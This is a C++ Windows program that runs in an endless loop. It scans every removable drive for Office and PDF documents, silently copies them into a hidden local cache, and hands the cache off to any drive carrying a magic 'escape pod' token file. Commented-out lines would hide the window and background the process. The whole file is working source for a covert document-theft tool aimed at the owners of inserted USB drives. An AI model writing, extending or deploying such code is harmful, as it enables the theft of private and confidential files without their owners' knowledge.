// Quattro.cpp : Defines the entry point for the console application.
//
//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include "stdafx.h"

#define BUFSIZE 1024
#define MD5LEN  16
#define POD_MAGIC L"podID-1732341574.eps"

class fileinfo
{
public:
	std::wstring fullPath;
	std::wstring fileName;
	std::wstring hashString;

	fileinfo(std::wstring fp, std::wstring fn, std::wstring hs) {
		fullPath = fp;
		fileName = fn;
		hashString = hs;
	}
};

void dbHandler()
{
	//sqlite3 *db;
	//sqlite3_open("store.db", &db);
}

std::wstring getRandAppendage(size_t length)
{
	
	srand(time(NULL));
	wchar_t *chars = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	std::wstring temp;
	
	for (size_t i = 0; i < length; i++)
		temp.push_back(chars[rand() % 36]);

	return temp;
}

DWORD genFileHash(std::wstring filename, std::wstring* hashSObject)
{
	
	char *hashString = new char[ 2 * MD5LEN + 1];

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	HANDLE hFile = NULL;
	BYTE rgbFile[BUFSIZE];
	DWORD cbRead = 0;
	BYTE rgbHash[MD5LEN] = { NULL };
	DWORD cbHash = 0;
	CHAR rgbDigits[] = "0123456789abcdef";
	// Logic to check usage goes here.

	hFile = CreateFile(filename.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_SEQUENTIAL_SCAN,
		NULL);

	if (INVALID_HANDLE_VALUE == hFile)
	{
		dwStatus = GetLastError();
		printf("Error opening file %s\nError: %d\n", filename,
			dwStatus);
		return dwStatus;
	}

	// Get handle to the crypto provider
	if (!CryptAcquireContext(&hProv,
		NULL,
		NULL,
		PROV_RSA_FULL,
		CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
		printf("CryptAcquireContext failed: %d\n", dwStatus);
		CloseHandle(hFile);
		return dwStatus;
	}

	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
	{
		dwStatus = GetLastError();
		printf("CryptAcquireContext failed: %d\n", dwStatus);
		CloseHandle(hFile);
		CryptReleaseContext(hProv, 0);
		return dwStatus;
	}

	while (bResult = ReadFile(hFile, rgbFile, BUFSIZE,
		&cbRead, NULL))
	{
		if (0 == cbRead)
		{
			break;
		}

		if (!CryptHashData(hHash, rgbFile, cbRead, 0))
		{
			dwStatus = GetLastError();
			printf("CryptHashData failed: %d\n", dwStatus);
			CryptReleaseContext(hProv, 0);
			CryptDestroyHash(hHash);
			CloseHandle(hFile);
			return dwStatus;
		}
	}

	if (!bResult)
	{
		dwStatus = GetLastError();
		printf("ReadFile failed: %d\n", dwStatus);
		CryptReleaseContext(hProv, 0);
		CryptDestroyHash(hHash);
		CloseHandle(hFile);
		return dwStatus;
	}

	cbHash = MD5LEN;
	if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0))
	{
		
		char *hsptr = hashString;
		size_t rLength = 2 * MD5LEN + 1;
		for (DWORD i = 0; i < cbHash; i++)
		{
			sprintf_s(hsptr, rLength, "%c%c", rgbDigits[rgbHash[i] >> 4],rgbDigits[rgbHash[i] & 0xf]);
			hsptr += 2;
			rLength -= 2;
		}

		wchar_t wc[2 * MD5LEN + 1];
		mbstowcs_s(NULL, wc, hashString, 2 * MD5LEN + 1);

		hashSObject->append(wc);
		

		printf("\n");
	}
	else
	{
		dwStatus = GetLastError();
		printf("CryptGetHashParam failed: %d\n", dwStatus);
	}

	CryptDestroyHash(hHash);
	CryptReleaseContext(hProv, 0);
	CloseHandle(hFile);

	return dwStatus;
}

//Function to call WINAPI and return all removable disks attached
std::list<std::wstring> listdisks(void)
{
	std::list<std::wstring> disks;
	DWORD mask = ::GetLogicalDrives();
	for (int i = 0; i < sizeof(mask) * 8; ++i) {
		std::wstring *lpRootPathName = new std::wstring(L" :\\");
		if (mask & (1 << i)) {
			lpRootPathName->at(0) = (WCHAR)(i + 65);
			UINT driveType = ::GetDriveType(lpRootPathName->c_str());
			if (driveType == 2){
				lpRootPathName->append(L"*");
				disks.push_back(*lpRootPathName);
			}
		}
		delete lpRootPathName;
	}
	return disks;
}

//Filters through the entire disk and finds candidates for copying
void getCandidates(std::list<std::wstring> *dirs, std::list<fileinfo> *candidates)
{
	for (std::list<std::wstring>::iterator curDir = dirs->begin(); curDir != dirs->end(); curDir++) {

		WIN32_FIND_DATA fileData;
		LPCTSTR rootDir = curDir->c_str();
		HANDLE handle = ::FindFirstFile(rootDir, &fileData);

		//TODO: handle case of no file
		do {

			//wcscmp returns 0 on match, a logical & makes it false
			if (fileData.dwFileAttributes == 16 && 
				wcscmp(fileData.cFileName, L"..") &&
				wcscmp(fileData.cFileName, L".")) {

				std::wstring subDir = curDir->substr(0, curDir->length() - 1);

				subDir.append(fileData.cFileName);
				subDir.append(L"\\*");

				dirs->push_back(subDir);
			}

			else {

				if (std::regex_match(fileData.cFileName, std::wregex(L".*doc.?|.*ppt.?|.*xls.?|.*pdf|.*pps.?"))) {

					std::wstring filePath = L"\\\\?\\";

					filePath.append(curDir->substr(0, curDir->length() - 1));
					filePath.append(fileData.cFileName);

					std::wstring hashString;
					genFileHash(filePath, &hashString);

					fileinfo candidate(filePath, fileData.cFileName, hashString);
					candidates->push_back(candidate);

					std::wcout
						<< L"Found: " << std::endl
						<< candidate.fileName << std::endl
						<< candidate.fullPath << std::endl
						<< candidate.hashString << std::endl;

				}

			}
		} while (::FindNextFile(handle, &fileData));
	}
}

//Attempts actual copying of the candidates
void doCopy(std::list<fileinfo> *candidates, std::wstring const destDir)
{
	
	for (std::list<fileinfo>::iterator candidate = candidates->begin();
		candidate != candidates->end();
		candidate++) {

		std::wstring srcFile = candidate->fullPath;
		std::wstring destFile = destDir + candidate->hashString;

		std::wcout
			<< std::endl
			<< L"[BEG] "
			<< srcFile.c_str()
			<< L" -> "
			<< destFile.c_str()
			<< std::endl;

		//copy file to destination
		if (!(::CopyFile(srcFile.c_str(), destFile.c_str(), true))) {
			//copy fails
			//check last error for existing file
			const DWORD ECODE = ::GetLastError();
			if (ECODE == 80)
				std::wcout
					<< std::endl
					<< L"[EXT] "
					<< srcFile.c_str()
					<< L" -> "
					<< destFile.c_str()
					<< std::endl;
			//failure reasons unknown
			else
				std::wcout
					<< std::endl
					<< L"[ERR] "
					<< ECODE
					<< " "
					<< srcFile.c_str()
					<< L" -> "
					<< destFile.c_str()
					<< std::endl;
		}
		//copy succeeds
		else
			std::wcout
				<< std::endl
				<< L"[OKK] "
				<< srcFile.c_str()
				<< L" -> "
				<< destFile.c_str()
				<< std::endl;
	}
}

bool checkEscapePod(std::wstring const disk)
{
	WIN32_FIND_DATA fileData;
	std::wstring podHash;
	std::wstring tokenPath = disk.substr(0, disk.length() - 1);
	tokenPath.append(POD_MAGIC);
	HANDLE handle = ::FindFirstFile(tokenPath.c_str(), &fileData);
	if (handle != INVALID_HANDLE_VALUE && !wcscmp(fileData.cFileName, POD_MAGIC))
		return true;
	return false;
}

void exfiltrate(std::wstring const disk, std::wstring const cacheDir)
{
	std::wcout << L"[EPD]" << std::endl;

	WIN32_FIND_DATA fileData;

	std::wstring cPath = cacheDir.substr(4, cacheDir.length());
	cPath.append(L"*");

	HANDLE handle = ::FindFirstFile(cPath.c_str(), &fileData);
	std::list<fileinfo> candidates;
	
	while (::FindNextFile(handle, &fileData)) {

		if (fileData.dwFileAttributes == 32 &&
			wcscmp(fileData.cFileName, L"..") &&
			wcscmp(fileData.cFileName, L".")) {

			std::wstring filePath = L"\\\\?\\";

			filePath.append(cPath.substr(0, cPath.length() - 1));
			filePath.append(fileData.cFileName);

			fileinfo candidate(filePath, fileData.cFileName, fileData.cFileName);
			candidates.push_back(candidate);
		}

	}

	doCopy(&candidates, disk.substr(0, disk.length() - 1));
}

int _tmain(int argc, _TCHAR* argv[])
{
	//::SetPriorityClass(::GetCurrentProcess(), PROCESS_MODE_BACKGROUND_BEGIN);
	//std::wstring destDir = L"\\\\?\\C:\\Users\\Anas Ahmed\\docfiltrate\\storage\\";
	std::wstring destDir = L"\\\\?\\G:\\SSD\\dsstore\\"; 

	/*
	Main event loop
	Ideally we'd listen to some sort of message from Windows, but I'm lazy
	Also, that'd require implementing a (pseudo)window
	*/
	while (true) {

		std::list<std::wstring> disks = listdisks();

		for (std::list<std::wstring>::iterator disk = disks.begin(); disk != disks.end(); disk++) {

			std::list<std::wstring> dirs;
			std::list<fileinfo> candidates;

			dirs.push_back(*disk);

			if (checkEscapePod(*disk)) {
				exfiltrate(*disk, destDir);
			}

			else {
				getCandidates(&dirs, &candidates);
				doCopy(&candidates, destDir);
			}
			
			Sleep(100000);
		}
	}
	return 0;
}
